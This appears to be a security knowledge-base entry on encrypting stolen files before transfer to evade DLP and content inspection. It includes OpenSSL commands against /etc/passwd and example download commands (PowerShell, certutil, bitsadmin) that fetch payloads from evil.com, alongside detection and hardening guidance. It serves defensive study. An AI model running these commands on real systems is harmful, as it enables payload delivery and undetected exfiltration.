examples.label: Encrypt a file with OpenSSL AES-256

notes: Encrypt/encode files before moving them (openssl aes, gpg, or a password zip) so DLP/IDS and sniffers can't read loot in transit, and to slip past content inspection. Decrypt on the other end.
name: Protected Transfers - Encrypt Files
description: Encrypt sensitive files before moving them so intercepted transfers are useless without the key. OpenSSL on Linux; Invoke-AESEncryption on Windows.

variations.label: OpenSSL encrypt / decrypt
variations.command:
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

defense.why_it_works: Encrypting a file before transfer (Invoke-AESEncryption.ps1 on Windows, openssl on Linux) or using an encrypted channel (openssl s_server/s_client, ncat --ssl) prevents the payload being read or signatured if intercepted in transit (HTB M07: encrypt sensitive data like NTDS.dit).
defense.prerequisites: An encryption tool (openssl / Invoke-AESEncryption) on both ends and a transfer channel.
defense.impact: The transferred file's contents are unreadable to network inspection/DLP, defeating signature and content-based detection.
defense.detection: Detection shifts from payload to metadata: an encrypted flow to an unknown host, the openssl/encryption command line (auditd/4104), and the new file on disk; content inspection yields nothing.
defense.artifacts: openssl / Invoke-AESEncryption command lines; an encrypted connection; the .aes/encrypted file.
defense.prevention: [MITRE T1105 M1031] IDS/IPS and egress filtering by destination/flow (since payload is opaque); alert on unusual encrypted flows to unknown hosts; EDR on the encryption tooling and the decrypted output.
defense.evasion: This IS an evasion of content inspection/DLP; using a common TLS port and a valid-looking cert (openssl-generated) further blends the flow.
defense.misconfiguration: Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.
defense.vulnerable_config:
# Living-off-the-land file download methods (all built into Windows/Linux):
# PowerShell (often bypasses older AV):
(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\Temp\shell.exe')

# certutil (trusted Microsoft binary, often not blocked):
certutil -urlcache -split -f http://evil.com/payload.exe payload.exe

# bitsadmin (background transfer service):
bitsadmin /transfer myJob http://evil.com/shell.exe C:\Temp\shell.exe

# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.
defense.secure_config:
# Application allowlisting (most effective):
# Windows Defender Application Control (WDAC) or AppLocker
# Only signed, approved executables run
# Blocks dropping and running arbitrary payloads even via LOLBins

# PowerShell Constrained Language Mode + AMSI:
# GPO: PowerShell Execution Policy = AllSigned
# Blocks unsigned scripts; AMSI scans all scripts before execution

# Egress filtering — block outbound to unknown IPs:
# Web proxy with allowlist for legitimate update sources
# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)
# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'

# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process
# Defender ATP: 'Suspicious process using Certutil to download content'
